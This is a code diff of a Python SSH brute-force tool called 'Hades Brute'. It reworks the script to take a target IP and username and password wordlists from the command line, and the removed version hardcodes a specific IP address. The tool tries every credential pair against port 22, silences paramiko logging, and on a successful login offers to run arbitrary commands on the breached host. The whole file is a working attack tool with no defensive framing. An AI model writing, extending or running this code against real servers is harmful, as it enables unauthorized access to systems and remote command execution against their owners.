@@ -1,62 +1,75 @@
-import paramiko, argparse, time, signal, os
+import paramiko, time, signal, os, sys, resource
 from colorama import *
+
+threads = []
 
 class Utils():
 	def Clear():
 		os.system('cls' if os.name == 'nt' else 'clear')
 
 	def Quit_Program(sig, frame):
-		print("\n"+Fore.LIGHTWHITE_EX+"["+Fore.LIGHTRED_EX+"✗"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTRED_EX+"Exiting AT Request Of User")
+		print("\n"+Fore.LIGHTWHITE_EX+"["+Fore.LIGHTRED_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTRED_EX+"Exiting AT Request Of User")
 		os._exit(0)
 
 	def Read_File(File_Name):
-		try:
+		if os.path.isfile(File_Name):
 			f = open(File_Name, "r").read().split('\n')
 			return f
+		else:
+			print(Fore.LIGHTWHITE_EX+"["+Fore.LIGHTRED_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTRED_EX+"Unable To Locate File: "+ File_Name)
+			os._exit(0)
+
+	def Title_Writer(Title):
+		print(f'\33]0;{Title}\a', end='', flush=True)
+
+class Hades_Brute():
+
+	def Execute_Command(SSH):
+		Hades = True
+		while Hades:
+			execute = input(Fore.LIGHTWHITE_EX+"Want To Execute A Command? "+Fore.LIGHTWHITE_EX+"("+Fore.LIGHTGREEN_EX+"y"+Fore.LIGHTWHITE_EX+"/"+Fore.LIGHTGREEN_EX+"n"+Fore.LIGHTWHITE_EX+")"+Fore.LIGHTGREEN_EX+": ")
+			if execute.lower() == "y":
+				command = input(Fore.LIGHTWHITE_EX+"Enter Command To Execute"+Fore.LIGHTGREEN_EX+": ")
+				(stdin, stdout, stderr) = SSH.exec_command(command)
+				for _ in stdout.readlines():
+					print(_)
+				Hades = False
+			elif execute.lower() == "n":
+				Hades = False
+			else:
+				print(Fore.LIGHTWHITE_EX+"["+Fore.LIGHTRED_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTRED_EX+"Invalid Option")
+
+
+	def Brute(IP, Username, Password):
+		SSH = paramiko.SSHClient()
+		SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+		try:
+			SSH.connect(IP, port=22, username=Username, password=Password, timeout=15, look_for_keys=False, allow_agent=False, banner_timeout=200)
+			print(Fore.LIGHTWHITE_EX+"["+Fore.LIGHTGREEN_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTGREEN_EX+"Found Login: "+Username+Fore.LIGHTWHITE_EX+":"+Fore.LIGHTGREEN_EX+Password)
+			Hades_Brute.Execute_Command(SSH)
+			SSH.close()
 		except Exception as e:
-			print(str(e))
+			print(e)
 
-class SSH_Brute():
+	def Main():
+		if len(sys.argv) <=3 or len(sys.argv) >=5:
+			print(Fore.LIGHTWHITE_EX+"["+Fore.LIGHTRED_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTRED_EX+"Invalid Usage")
+			print(Fore.LIGHTWHITE_EX+"["+Fore.LIGHTRED_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTRED_EX+sys.argv[0] +" <IP> <Username_File> <Password_File>")
+			os._exit(0)
+		else:
+			Count = 0
+			print(Fore.LIGHTWHITE_EX+"["+Fore.LIGHTGREEN_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTGREEN_EX+"Initializing SSH Bruter")
+			Utils.Title_Writer("Hades Brute")
+			IP = sys.argv[1]
+			Username_File = Utils.Read_File(sys.argv[2])
+			Password_File = Utils.Read_File(sys.argv[3])
+			for u in Username_File:
+				for p in Password_File:
+					Count += 1
+					Hades_Brute.Brute(IP, u, p)
 
-	def Parse():
-		parser=argparse.ArgumentParser(description="Hades SSH Brute Force")
-		parser.add_argument("--username",help="Username File Location")
-		parser.add_argument("--password",help="Password File Location")
-		parser.add_argument("--port", help="SSH Port To Brute (Defult Is 22)",type=int,default=22)
-		args=parser.parse_args()
+			print(Fore.LIGHTWHITE_EX+"["+Fore.LIGHTGREEN_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTGREEN_EX+"Finished Trying "+str(Count) + " Combinations")
 
-		try:
-			Username_File = args.username
-			Passowrd_File = args.password
-			Port = args.port
-		except AttributeError:
-			print("Please Run --help")
-			quit()
-
-		Usernames = Utils.Read_File(Username_File)
-		Passwords = Utils.Read_File(Passowrd_File)
-		
-		print(Fore.LIGHTWHITE_EX+"["+Fore.LIGHTGREEN_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTGREEN_EX+"Initializing SSH Bruter ")
-		for u in Usernames:
-			for p in Passwords:
-				SSH_Brute.Brute(u,p,Port)
-
-
-	def Brute(Username, Password, Port):
-		try:
-			p = paramiko.SSHClient()
-			p.set_missing_host_key_policy(paramiko.AutoAddPolicy())   
-			p.connect("209.126.4.150", port=Port, username=Username, password=Password, banner_timeout=None)
-			print(Fore.LIGHTWHITE_EX+"["+Fore.LIGHTGREEN_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTGREEN_EX+"Found Valid Credentials "+Username + Fore.LIGHTWHITE_EX + ":" +Fore.LIGHTGREEN_EX+ Password)
-		except (paramiko.ssh_exception.AuthenticationException):
-			print(Fore.LIGHTWHITE_EX+"["+Fore.LIGHTRED_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTRED_EX+"Failed To Brute Using "+Username + Fore.LIGHTWHITE_EX + ":" +Fore.LIGHTRED_EX+ Password)
-		except:
-			print(Fore.LIGHTWHITE_EX+"["+Fore.LIGHTRED_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTRED_EX+"Quota exceeded, Waiting 60 Seconds")
-			time.sleep(60)
-			SSH_Brute.Brute(Username,Password,Port)
-
-		p.close()
-
+paramiko.util.log_to_file("/dev/null", level = "INFO")			
 signal.signal(signal.SIGINT, Utils.Quit_Program)
-Utils.Clear()
-SSH_Brute.Parse()
+Hades_Brute.Main()
